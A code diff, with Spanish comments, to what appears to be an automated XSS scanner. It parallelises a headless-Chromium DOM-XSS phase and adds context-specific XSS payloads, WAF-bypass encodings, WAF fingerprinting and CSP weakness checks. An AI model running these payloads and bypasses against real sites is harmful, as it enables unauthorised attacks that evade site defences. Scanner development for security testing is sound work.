@@ -27,16 +27,17 @@ init()
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ── DOM XSS headless config ────────────────────────────────────────────────────
+# Solo los 2 payloads más efectivos para DOM-based: img onerror y svg onload.
+# Más payloads = más tiempo por URL. Si alguno falla el otro suele cubrir el caso.
 _DOM_XSS_PAYLOADS = [
     "<img src=x onerror=\"alert('neluxXSS')\">",
     "<svg/onload=\"alert('neluxXSS')\">",
-    "<iframe src=\"javascript:alert('neluxXSS')\">",
-    "<details open ontoggle=\"alert('neluxXSS')\">",
 ]
 _DOM_XSS_MARKER    = "neluxXSS"
-_DOM_XSS_URL_LIMIT = 80    # max URLs testeadas headlessly
-_DOM_XSS_TIMEOUT   = 7000  # ms por navegación
-_DOM_XSS_SETTLE    = 2000  # ms de espera post-load para que el framework renderice
+_DOM_XSS_URL_LIMIT = 60    # max URLs testeadas headlessly (reducido de 80)
+_DOM_XSS_TIMEOUT   = 4000  # ms por navegación (reducido de 7000)
+_DOM_XSS_SETTLE    = 600   # ms de espera post-load (reducido de 2000; la mayoría de SPAs renderizan en <500ms)
+_DOM_XSS_MAX_WORKERS = 4   # instancias paralelas de Chromium (cada thread lanza su propio browser)
 
 # Parámetros que suelen reflejarse en el DOM (mayor prioridad en el batch headless)
 _DOM_XSS_PRIORITY_PARAMS: frozenset = frozenset({
@@ -125,11 +126,16 @@ def _dom_xss_batch(
     urls: list,
     already_found: set,
     custom_headers: dict = None,
+    threads: int = None,
 ) -> list:
     """
-    Fase DOM-based XSS con Playwright headless Chromium.
+    Fase DOM-based XSS con Playwright headless Chromium — ejecución paralela.
 
-    Lanza UNA sola sesión de browser y prueba hasta _DOM_XSS_URL_LIMIT URLs.
+    Lanza `_DOM_XSS_MAX_WORKERS` instancias independientes de Chromium en threads
+    separados, cada una trabajando sobre su chunk de URLs.
+    Cada instancia tiene su propio sync_playwright / browser / page, lo que evita
+    la condición de carrera de compartir objetos Playwright entre hilos.
+
     Detecta ejecución JS real escuchando el evento 'dialog' (alert/confirm/prompt).
     Las URLs con parámetros de alta prioridad (q=, search=, content=…) se prueban primero.
 
@@ -163,86 +169,111 @@ def _dom_xss_batch(
         if total_cand == 0:
             return []
 
-        dialog_history: list = []
+        # Determinar workers: limitado por cantidad de URLs y _DOM_XSS_MAX_WORKERS
+        n_workers = max(1, min(_DOM_XSS_MAX_WORKERS, threads or _DOM_XSS_MAX_WORKERS, total_cand))
 
-        def _on_dialog(dialog):
+        # Dividir candidatos en n_workers chunks
+        chunks = [candidates[i::n_workers] for i in range(n_workers)]
+
+        results_lock = threading.Lock()
+        progress_lock = threading.Lock()
+        done_counter = [0]
+
+        def _worker(chunk: list) -> None:
+            """Cada worker lanza su propio browser y procesa su chunk."""
             try:
-                msg = dialog.message or ""
-            except Exception:
-                msg = ""
-            dialog_history.append(msg)
-            try:
-                dialog.dismiss()
+                with sync_playwright() as pw:
+                    browser = pw.chromium.launch(
+                        headless=True,
+                        args=[
+                            "--no-sandbox",
+                            "--disable-dev-shm-usage",
+                            "--disable-gpu",
+                            "--disable-software-rasterizer",
+                        ],
+                    )
+                    try:
+                        ctx = browser.new_context(
+                            ignore_https_errors=True,
+                            extra_http_headers=custom_headers or {},
+                        )
+                        page = ctx.new_page()
+                        dialog_history: list = []
+
+                        def _on_dialog(dialog):
+                            try:
+                                msg = dialog.message or ""
+                            except Exception:
+                                msg = ""
+                            dialog_history.append(msg)
+                            try:
+                                dialog.dismiss()
+                            except Exception:
+                                pass
+
+                        page.on("dialog", _on_dialog)
+
+                        for url in chunk:
+                            with progress_lock:
+                                done_counter[0] += 1
+                                cnt = done_counter[0]
+                            sys.stdout.write(
+                                f"\r\033[K  [DOM XSS] {cnt}/{total_cand} (×{n_workers}w) | {url[:70]}"
+                            )
+                            sys.stdout.flush()
+
+                            parsed = urlparse(url)
+                            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+                            qs = parse_qs(parsed.query)
+
+                            vuln_found_for_url = False
+                            for param in qs:
+                                if _is_non_injectable_param(param):
+                                    continue
+                                if vuln_found_for_url:
+                                    break
+
+                                for payload in _DOM_XSS_PAYLOADS:
+                                    dialog_history.clear()
+
+                                    data = {p: "TEST123" for p in qs}
+                                    data[param] = payload
+                                    test_url_str = base_url + "?" + urllib.parse.urlencode(data, doseq=True)
+
+                                    try:
+                                        page.goto(
+                                            test_url_str,
+                                            wait_until="domcontentloaded",
+                                            timeout=_DOM_XSS_TIMEOUT,
+                                        )
+                                        page.wait_for_timeout(_DOM_XSS_SETTLE)
+                                    except Exception:
+                                        continue
+
+                                    if any(_DOM_XSS_MARKER in m for m in dialog_history):
+                                        sys.stdout.write("\r\033[K")
+                                        sys.stdout.flush()
+                                        with results_lock:
+                                            results.append((test_url_str, param, payload))
+                                        vuln_found_for_url = True
+                                        break
+                    finally:
+                        try:
+                            browser.close()
+                        except Exception:
+                            pass
             except Exception:
                 pass
 
-        with sync_playwright() as p:
-            browser = p.chromium.launch(
-                headless=True,
-                args=[
-                    "--no-sandbox",
-                    "--disable-dev-shm-usage",
-                    "--disable-gpu",
-                    "--disable-software-rasterizer",
-                ],
-            )
-            try:
-                ctx = browser.new_context(
-                    ignore_https_errors=True,
-                    extra_http_headers=custom_headers or {},
-                )
-                page = ctx.new_page()
-                page.on("dialog", _on_dialog)
+        # Lanzar workers en paralelo con ThreadPoolExecutor
+        from concurrent.futures import ThreadPoolExecutor, as_completed
+        with ThreadPoolExecutor(max_workers=n_workers) as executor:
+            futs = [executor.submit(_worker, chunk) for chunk in chunks if chunk]
+            for fut in as_completed(futs):
+                fut.result()  # propaga excepciones si las hay
 
-                for idx, url in enumerate(candidates, 1):
-                    # Progress en línea (sobreescribe la misma línea)
-                    sys.stdout.write(
-                        f"\r\033[K  [DOM XSS] {idx}/{total_cand} | {url[:80]}"
-                    )
-                    sys.stdout.flush()
-
-                    parsed = urlparse(url)
-                    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
-                    qs = parse_qs(parsed.query)
-
-                    vuln_found_for_url = False
-                    for param in qs:
-                        if _is_non_injectable_param(param):
-                            continue
-                        if vuln_found_for_url:
-                            break
-
-                        for payload in _DOM_XSS_PAYLOADS:
-                            dialog_history.clear()
-
-                            data = {p: "TEST123" for p in qs}
-                            data[param] = payload
-                            test_url_str = base_url + "?" + urllib.parse.urlencode(data, doseq=True)
-
-                            try:
-                                page.goto(
-                                    test_url_str,
-                                    wait_until="domcontentloaded",
-                                    timeout=_DOM_XSS_TIMEOUT,
-                                )
-                                page.wait_for_timeout(_DOM_XSS_SETTLE)
-                            except Exception:
-                                continue
-
-                            if any(_DOM_XSS_MARKER in m for m in dialog_history):
-                                sys.stdout.write("\r\033[K")
-                                sys.stdout.flush()
-                                results.append((test_url_str, param, payload))
-                                vuln_found_for_url = True
-                                break
-
-            finally:
-                sys.stdout.write("\r\033[K")
-                sys.stdout.flush()
-                try:
-                    browser.close()
-                except Exception:
-                    pass
+        sys.stdout.write("\r\033[K")
+        sys.stdout.flush()
 
     except Exception:
         pass
@@ -252,57 +283,197 @@ def _dom_xss_batch(
     return results
 
 
-def is_xss_response(text, payload):
-    """Validación más estricta para detectar XSS real"""
-    
-    # Verificar si el payload se refleja exactamente en el cuerpo de la respuesta
-    if payload in text:
-        return True
-    
-    # Verificar si el payload se refleja de forma codificada
-    import html
-    decoded_payload = html.unescape(payload)
-    if decoded_payload in text:
-        return True
-    
-    # Verificar si el payload se refleja en atributos HTML (más específico)
-    if f'"{payload}"' in text or f"'{payload}'" in text:
-        return True
-    
-    # Verificar si hay indicadores específicos de XSS exitoso
-    xss_indicators = [
-        "<script>",
-        "javascript:",
-        "onerror=",
-        "onload=",
-        "onclick=",
-        "onmouseover=",
-        "onfocus=",
-        "alert(",
-        "prompt(",
-        "confirm(",
-        "document.cookie",
-        "window.location",
-        "eval(",
-        "innerHTML"
-    ]
-    
-    # Evitar páginas de error HTTP claras (sin contenido de la app)
-    if "404 not found" in text.lower() or "403 forbidden" in text.lower() or "500 internal server error" in text.lower():
+def is_xss_response(text, payload, context: str = None):
+    """Validación estricta para detectar XSS real, evitando falsos positivos comunes."""
+
+    import html as _html
+
+    # Salida rápida si la respuesta parece un error HTTP sin contenido de app
+    tl = text.lower()
+    if "404 not found" in tl or "403 forbidden" in tl or "500 internal server error" in tl:
         return False
-    
-    # EVITAR FALSOS POSITIVOS: Si hay errores de SQL, NO es XSS
-    if "sql syntax" in text.lower() or "mysql" in text.lower() or "you have an error in your sql" in text.lower():
+
+    # Evitar confusión con errores SQL (el payload puede estar en el mensaje de error)
+    if "sql syntax" in tl or "you have an error in your sql" in tl:
         return False
-    
-    # Verificar que la respuesta tenga contenido significativo
+
     if len(text.strip()) < 50:
         return False
-    
-    # Solo reportar si el payload está literalmente reflejado en el HTML sin escapar.
-    # "indicator_count >= 2" fue eliminado: los CMS modernos siempre tienen onclick/eval/etc.
-    # en su JS, lo que causaba falsos positivos en cualquier página con JS.
-    return payload in text
+
+    # Para bypasses de contexto js_string (ej: '";alert(1)//'):
+    # 1. El payload debe aparecer DENTRO de un bloque <script>, no solo en el body HTML.
+    #    Si aparece en el HTML fuera de script (ej: <p>Resultado: ";alert(1)//</p>),
+    #    el XSS no ejecuta → falso positivo.
+    # 2. La comilla inicial NO debe estar backslash-escapada (\";alert(1)// no ejecuta).
+    if context == "js_string" or (payload and payload[:1] in ('"', "'") and "alert" in payload):
+        candidates = [payload, _html.unescape(payload)]
+        for candidate in candidates:
+            # Verificar que el payload esté dentro de al menos un bloque <script>
+            script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', text, re.DOTALL | re.IGNORECASE)
+            in_script = any(candidate in block for block in script_blocks)
+            if not in_script:
+                continue  # solo aparece en HTML body, no ejecutable
+            # Verificar que la comilla no esté backslash-escapada
+            escaped_variant = "\\" + candidate
+            for block in script_blocks:
+                if candidate not in block:
+                    continue
+                if escaped_variant in block and candidate not in block.replace(escaped_variant, ""):
+                    continue  # comilla escapada en este bloque
+                return True  # payload sin escapar dentro de <script>
+        return False
+
+    # Caso general: reflejo exacto del payload
+    if payload in text:
+        return True
+
+    decoded_payload = _html.unescape(payload)
+    if decoded_payload in text:
+        return True
+
+    # Reflejo dentro de comillas en atributo HTML
+    if f'"{payload}"' in text or f"'{payload}'" in text:
+        return True
+
+    return False
+
+
+# ---------------------------------------------------------------------------
+# ANÁLISIS MULTI-CAPA: contexto, CSP, WAF y bypass payloads
+# ---------------------------------------------------------------------------
+
+_XSS_MARKER = "NELUXMATIZER"
+
+# Payloads por contexto de reflejo
+_XSS_CONTEXT_PAYLOADS: dict = {
+    "html_body": [
+        '<img src=x onerror=alert(1)>',
+        '<svg onload=alert(1)>',
+        '<details open ontoggle=alert(1)>',
+        '<iframe src="javascript:alert(1)">',
+    ],
+    "html_attr": [
+        '" onmouseover="alert(1)" x="',
+        "' onmouseover='alert(1)' x='",
+        '"><img src=x onerror=alert(1)>',
+        '" onfocus="alert(1)" autofocus="',
+    ],
+    "js_string": [
+        '";alert(1)//',
+        "';alert(1)//",
+        "</script><script>alert(1)</script>",
+        '`; alert(1) //`',
+    ],
+    "href_attr": [
+        'javascript:alert(1)',
+        'JaVaScRiPt:alert(1)',
+        'data:text/html,<script>alert(1)</script>',
+    ],
+}
+
+# Payloads de bypass de WAF (encoding, fragmentación, obfuscación)
+_XSS_WAF_BYPASS_PAYLOADS: list = [
+    '<img src=x onerror=alert`1`>',
+    '<svg/onload=alert(1)>',
+    '<details/open/ontoggle=alert(1)>',
+    '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">',
+    '<img src=x onerror=\u0061lert(1)>',
+    '<<script>alert(1)//<</script>',
+    '<a href="javas&#99;ript:alert(1)">x</a>',
+]
+
+# Firmas de WAF comunes en headers y body
+_WAF_SIGNATURES: dict = {
+    "cloudflare":  ["cloudflare", "cf-ray", "__cfduid", "attention required", "error 1010"],
+    "akamai":      ["akamai", "reference #", "access denied - akamai"],
+    "aws_waf":     ["awswaf", "x-amzn-requestid", "aws-waf"],
+    "f5_bigip":    ["the requested url was rejected", "f5 networks"],
+    "modsecurity": ["mod_security", "406 not acceptable", "modsecurity"],
+    "imperva":     ["incapsula", "imperva", "_incap_"],
+    "sucuri":      ["sucuri", "cloudproxy"],
+    "barracuda":   ["barracuda", "barra_counter_session"],
+}
+
+
+def _detect_xss_context(text: str) -> str:
+    """
+    Detecta el contexto HTML donde aparece el marker NELUXMATIZER.
+    Retorna: 'js_string' | 'href_attr' | 'html_attr' | 'html_body'
+    Solo se llama cuando el marker está en el texto pero el payload fue modificado.
+    """
+    marker = _XSS_MARKER
+    # 1. Dentro de <script>...</script>
+    for m in re.finditer(r'<script[^>]*>(.*?)</script>', text, re.DOTALL | re.IGNORECASE):
+        if marker in m.group(1):
+            return "js_string"
+    # 2. En atributo href, src, action, formaction
+    if re.search(r'(?:href|src|action|formaction)=["\'][^"\']*' + re.escape(marker),
+                 text, re.IGNORECASE):
+        return "href_attr"
+    # 3. En otros atributos HTML (value, placeholder, title, data-*, etc.)
+    if re.search(r'[\w-]+=(?:["\'][^"\']*' + re.escape(marker) + r')', text, re.IGNORECASE):
+        return "html_attr"
+    return "html_body"
+
+
+def _parse_csp(headers) -> tuple:
+    """
+    Parsea el header CSP. Retorna (csp_value, [weaknesses]).
+    Posibles debilidades: 'no-csp', 'unsafe-inline', 'unsafe-eval',
+    'wildcard-src', 'report-only', 'jsonp-cdn:<cdn>'.
+    """
+    csp = (headers.get("Content-Security-Policy") or
+           headers.get("content-security-policy") or "")
+    report_only = (headers.get("Content-Security-Policy-Report-Only") or
+                   headers.get("content-security-policy-report-only") or "")
+    if not csp:
+        if report_only:
+            return report_only, ["report-only"]
+        return "", ["no-csp"]
+
+    weaknesses = []
+    csp_lower = csp.lower()
+    if "'unsafe-inline'" in csp_lower:
+        weaknesses.append("unsafe-inline")
+    if "'unsafe-eval'" in csp_lower:
+        weaknesses.append("unsafe-eval")
+    if re.search(r'script-src\s+\*|default-src\s+\*', csp_lower):
+        weaknesses.append("wildcard-src")
+    jsonp_cdns = [
+        "cdn.jsdelivr.net", "cdnjs.cloudflare.com", "code.jquery.com",
+        "ajax.googleapis.com", "unpkg.com",
+    ]
+    for cdn in jsonp_cdns:
+        if cdn in csp_lower:
+            weaknesses.append(f"jsonp-cdn:{cdn}")
+    return csp, weaknesses
+
+
+def _detect_waf(response) -> str:
+    """Retorna nombre del WAF detectado, o '' si no se detecta ninguna firma."""
+    headers_lower = str(dict(response.headers)).lower()
+    body_lower = response.text[:2000].lower()
+    for waf_name, sigs in _WAF_SIGNATURES.items():
+        if any(s in headers_lower or s in body_lower for s in sigs):
+            return waf_name
+    # Status 403/406 con body muy corto → WAF genérico
+    if response.status_code in (403, 406, 429) and len(response.text) < 500:
+        return "generic-waf"
+    return ""
+
+
+def _xss_bypass_payloads_for(context: str, headers) -> list:
+    """
+    Combina payloads de bypass contextuales + WAF (si hay CSP débil).
+    Retorna lista de payloads a probar (máx. 4 para no aumentar latencia).
+    """
+    _, csp_weaknesses = _parse_csp(headers)
+    payloads = list(_XSS_CONTEXT_PAYLOADS.get(context, _XSS_CONTEXT_PAYLOADS["html_body"]))
+    # Si hay CSP con unsafe-inline o sin CSP, los payloads contextuales ya funcionan
+    # Si hay CSP estricta, agregar payloads de WAF/encoding como alternativa
+    if "no-csp" not in csp_weaknesses and "unsafe-inline" not in csp_weaknesses:
+        payloads = _XSS_WAF_BYPASS_PAYLOADS[:3] + payloads[:2]
+    return payloads[:4]  # Máximo 4 requests extra por param
 
 def xss(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, random_agent=False):
     print('\033[1;36m<<<<<<<<<<<<\033[0m Testing Cross-Site Scripting \033[1;36m>>>>>>>>>>>>>\033[0m')
@@ -375,31 +546,70 @@ def xss(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, ra
             data[param] = payload
             try:
                 r = session.get(base_url, params=data, verify=False, timeout=5, allow_redirects=True)
-                
-                # Solo procesar si la respuesta es exitosa Y el payload se refleja realmente
+
+                def _report_xss_get(winning_payload, method_label="GET"):
+                    """Reporta XSS confirmado y termina el loop."""
+                    if not vuln_manager.is_already_exploited(base_url, param):
+                        if not vuln_manager.verify_false_positive(base_url, winning_payload, method_label, custom_headers, random_agent):
+                            vuln_manager.mark_as_exploited(base_url, param)
+                            vuln_manager.mark_as_exploited(base_url, base_url_only=True)
+                            with stdout_lock:
+                                print_vulnerability(f"\033[1;32m[{method_label}] [VULNERABLE]\033[0m {base_url}?{param}={quote(winning_payload)}")
+                            entry = f"{base_url}?{param}={quote(winning_payload)}"
+                            if method_label not in ("GET", "POST"):
+                                entry += f"|||BYPASS_TECHNIQUE:{method_label}|||BYPASS_ORIGINAL:{quote(payload)}"
+                            urls_vulnerables.append(entry)
+                            return True
+                    return False
+
+                # ── CAPA 1: detección directa ──────────────────────────────
                 if r.status_code == 200 and is_xss_response(r.text, payload) and r.text != baseline:
-                    # Verificar que el payload realmente se refleja (no solo en URL)
                     if payload in r.text or urllib.parse.unquote(payload) in r.text:
-                        # Verificar si ya se explotó esta combinación específica
-                        if not vuln_manager.is_already_exploited(base_url, param):
-                            # Verificar falso positivo
-                            if not vuln_manager.verify_false_positive(base_url, payload, "GET", custom_headers, random_agent):
-                                # Marcar como explotada
-                                vuln_manager.mark_as_exploited(base_url, param)
-                                vuln_manager.mark_as_exploited(base_url, base_url_only=True)
-                                
-                                # Salida sincronizada usando la nueva función
-                                with stdout_lock:
-                                    print_vulnerability(f"\033[1;32m[GET] [VULNERABLE]\033[0m {base_url}?{param}={quote(payload)}")
-                                
-                                # Guardar URL con payload para el PoC
-                                urls_vulnerables.append(f"{base_url}?{param}={quote(payload)}")
-                                found += 1
-                                # CORTAR INMEDIATAMENTE - no probar más payloads en esta URL
-                                with lock:
-                                    current += 1
-                                    update_progress(current, total)
-                                return
+                        if _report_xss_get(payload):
+                            with lock:
+                                current += 1
+                                update_progress(current, total)
+                            found += 1
+                            return
+
+                # ── CAPA 2: bypass contextual (marker presente pero escapado) ─
+                elif r.status_code == 200 and _XSS_MARKER in r.text and r.text != baseline:
+                    context = _detect_xss_context(r.text)
+                    bypass_list = _xss_bypass_payloads_for(context, r.headers)
+                    for bp in bypass_list:
+                        bp_data = {p: "TEST123" for p in qs}
+                        bp_data[param] = bp
+                        try:
+                            rb = session.get(base_url, params=bp_data, verify=False, timeout=5, allow_redirects=True)
+                            if rb.status_code == 200 and is_xss_response(rb.text, bp, context) and rb.text != baseline:
+                                if _report_xss_get(bp, f"GET-BYPASS[{context}]"):
+                                    with lock:
+                                        current += 1
+                                        update_progress(current, total)
+                                    found += 1
+                                    return
+                        except Exception:
+                            continue
+
+                # ── CAPA 3: WAF detectado → bypass de encoding ─────────────
+                elif r.status_code in (403, 406, 429):
+                    waf = _detect_waf(r)
+                    if waf:
+                        for wp in _XSS_WAF_BYPASS_PAYLOADS[:3]:
+                            wp_data = {p: "TEST123" for p in qs}
+                            wp_data[param] = wp
+                            try:
+                                rw = session.get(base_url, params=wp_data, verify=False, timeout=5, allow_redirects=True)
+                                if rw.status_code == 200 and is_xss_response(rw.text, wp) and rw.text != baseline:
+                                    if _report_xss_get(wp, f"GET-WAF-BYPASS[{waf}]"):
+                                        with lock:
+                                            current += 1
+                                            update_progress(current, total)
+                                        found += 1
+                                        return
+                            except Exception:
+                                continue
+
             except requests.exceptions.Timeout:
                 continue
             except requests.exceptions.RequestException:
@@ -438,25 +648,69 @@ def xss(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, ra
             data[param] = payload
             try:
                 r = session.post(base_url, data=data, verify=False, timeout=5, allow_redirects=True)
-                
-                # Solo procesar si la respuesta es exitosa Y el payload se refleja realmente
+
+                def _report_xss_post(winning_payload, method_label="POST"):
+                    if not vuln_manager.is_already_exploited(base_url, param):
+                        if not vuln_manager.verify_false_positive(base_url, winning_payload, method_label, custom_headers, random_agent):
+                            vuln_manager.mark_as_exploited(base_url, param)
+                            vuln_manager.mark_as_exploited(base_url, base_url_only=True)
+                            with stdout_lock:
+                                print_vulnerability(f"\033[1;32m[{method_label}] [VULNERABLE]\033[0m {base_url}?{param}={quote(winning_payload)}")
+                            entry = f"{base_url}?{param}={quote(winning_payload)}"
+                            if method_label not in ("GET", "POST"):
+                                entry += f"|||BYPASS_TECHNIQUE:{method_label}|||BYPASS_ORIGINAL:{quote(payload)}"
+                            urls_vulnerables.append(entry)
+                            return True
+                    return False
+
+                # ── CAPA 1: detección directa ──────────────────────────────
                 if r.status_code == 200 and is_xss_response(r.text, payload) and r.text != baseline:
-                    # Verificar que el payload realmente se refleja (no solo en URL)
                     if payload in r.text or urllib.parse.unquote(payload) in r.text:
-                        if not vuln_manager.is_already_exploited(base_url, param):
-                            if not vuln_manager.verify_false_positive(base_url, payload, "POST", custom_headers, random_agent):
-                                vuln_manager.mark_as_exploited(base_url, param)
-                                vuln_manager.mark_as_exploited(base_url, base_url_only=True)
+                        if _report_xss_post(payload):
+                            found += 1
+                            with lock:
+                                current += 1
+                                update_progress(current, total)
+                            return
 
-                                with stdout_lock:
-                                    print_vulnerability(f"\033[1;32m[POST] [VULNERABLE]\033[0m {base_url}?{param}={quote(payload)}")
+                # ── CAPA 2: bypass contextual ──────────────────────────────
+                elif r.status_code == 200 and _XSS_MARKER in r.text and r.text != baseline:
+                    context = _detect_xss_context(r.text)
+                    bypass_list = _xss_bypass_payloads_for(context, r.headers)
+                    for bp in bypass_list:
+                        bp_data = {p: "TEST123" for p in qs}
+                        bp_data[param] = bp
+                        try:
+                            rb = session.post(base_url, data=bp_data, verify=False, timeout=5, allow_redirects=True)
+                            if rb.status_code == 200 and is_xss_response(rb.text, bp, context) and rb.text != baseline:
+                                if _report_xss_post(bp, f"POST-BYPASS[{context}]"):
+                                    found += 1
+                                    with lock:
+                                        current += 1
+                                        update_progress(current, total)
+                                    return
+                        except Exception:
+                            continue
 
-                                urls_vulnerables.append(f"{base_url}?{param}={quote(payload)}")
-                                found += 1
-                                with lock:
-                                    current += 1
-                                    update_progress(current, total)
-                                return
+                # ── CAPA 3: WAF ────────────────────────────────────────────
+                elif r.status_code in (403, 406, 429):
+                    waf = _detect_waf(r)
+                    if waf:
+                        for wp in _XSS_WAF_BYPASS_PAYLOADS[:3]:
+                            wp_data = {p: "TEST123" for p in qs}
+                            wp_data[param] = wp
+                            try:
+                                rw = session.post(base_url, data=wp_data, verify=False, timeout=5, allow_redirects=True)
+                                if rw.status_code == 200 and is_xss_response(rw.text, wp) and rw.text != baseline:
+                                    if _report_xss_post(wp, f"POST-WAF-BYPASS[{waf}]"):
+                                        found += 1
+                                        with lock:
+                                            current += 1
+                                            update_progress(current, total)
+                                        return
+                            except Exception:
+                                continue
+
             except requests.exceptions.Timeout:
                 continue
             except requests.exceptions.RequestException:
@@ -539,20 +793,62 @@ def xss(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, ra
                 else:
                     res = session.get(full_url, params=data, timeout=5)
 
-                # Solo procesar si la respuesta es exitosa
-                if res.status_code == 200 and is_xss_response(res.text, payload) and res.text != baseline:
-                    # Clave de dedup usando URL normalizada (sin UTM) y campos del form
-                    key = f"{norm_url}|{','.join(sorted(data.keys()))}|{payload}"
-                    if key not in vuln_set:
+                def _report_xss_form(winning_payload, winning_data, label="FORM"):
+                    key = f"{norm_url}|{','.join(sorted(winning_data.keys()))}|{winning_payload}"
+                    with lock:
+                        if key in vuln_set:
+                            return False
                         vuln_set.add(key)
+                    with stdout_lock:
+                        encoded_data = {k: urllib.parse.quote_plus(v) for k, v in winning_data.items()}
+                        print_vulnerability(f"\033[1;32m[{label}] [VULNERABLE]\033[0m {norm_url}" + "\033[1;32m ==> \033[0m" + f"{encoded_data}")
+                    entry = f"{norm_url} => {winning_data}"
+                    if label != "FORM":
+                        entry += f"|||BYPASS_TECHNIQUE:{label}|||BYPASS_ORIGINAL:{quote(payload)}"
+                    urls_vulnerables.append(entry)
+                    return True
+                    return False
 
-                        with stdout_lock:
-                            encoded_data = {k: urllib.parse.quote_plus(v) for k, v in data.items()}
-                            print_vulnerability(f"\033[1;32m[FORM] [VULNERABLE]\033[0m {norm_url}" + "\033[1;32m ==> \033[0m" + f"{encoded_data}")
-
-                        # Reportar con URL normalizada (sin UTM) para el PoC
-                        urls_vulnerables.append(f"{norm_url} => {data}")
+                # ── CAPA 1: detección directa ──────────────────────────────
+                if res.status_code == 200 and is_xss_response(res.text, payload) and res.text != baseline:
+                    if _report_xss_form(payload, data):
                         found += 1
+
+                # ── CAPA 2: bypass contextual (marker presente pero escapado) ─
+                elif res.status_code == 200 and _XSS_MARKER in res.text and res.text != baseline:
+                    context = _detect_xss_context(res.text)
+                    bypass_list = _xss_bypass_payloads_for(context, res.headers)
+                    for bp in bypass_list:
+                        bp_data = {k: bp for k in data}
+                        try:
+                            if method == "post":
+                                rb = session.post(full_url, data=bp_data, timeout=5)
+                            else:
+                                rb = session.get(full_url, params=bp_data, timeout=5)
+                            if rb.status_code == 200 and is_xss_response(rb.text, bp, context) and rb.text != baseline:
+                                if _report_xss_form(bp, bp_data, f"FORM-BYPASS[{context}]"):
+                                    found += 1
+                                    break
+                        except Exception:
+                            continue
+
+                # ── CAPA 3: WAF ────────────────────────────────────────────
+                elif res.status_code in (403, 406, 429):
+                    waf = _detect_waf(res)
+                    if waf:
+                        for wp in _XSS_WAF_BYPASS_PAYLOADS[:3]:
+                            wp_data = {k: wp for k in data}
+                            try:
+                                if method == "post":
+                                    rw = session.post(full_url, data=wp_data, timeout=5)
+                                else:
+                                    rw = session.get(full_url, params=wp_data, timeout=5)
+                                if rw.status_code == 200 and is_xss_response(rw.text, wp) and rw.text != baseline:
+                                    if _report_xss_form(wp, wp_data, f"FORM-WAF-BYPASS[{waf}]"):
+                                        found += 1
+                                        break
+                            except Exception:
+                                continue
         except requests.exceptions.Timeout:
             pass  # Skip timeouts silently
         except requests.exceptions.RequestException:
@@ -595,8 +891,9 @@ def xss(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, ra
         except Exception:
             pass
 
-    print('\033[1;36m[*] DOM XSS phase (headless Chromium)...\033[0m')
-    dom_results = _dom_xss_batch(urip, http_found_bases, custom_headers)
+    dom_workers = max(1, min(_DOM_XSS_MAX_WORKERS, threads))
+    print(f'\033[1;36m[*] DOM XSS phase (headless Chromium, {dom_workers} parallel workers)...\033[0m')
+    dom_results = _dom_xss_batch(urip, http_found_bases, custom_headers, threads=dom_workers)
 
     dom_found = 0
     for (dom_url, dom_param, dom_payload) in dom_results:
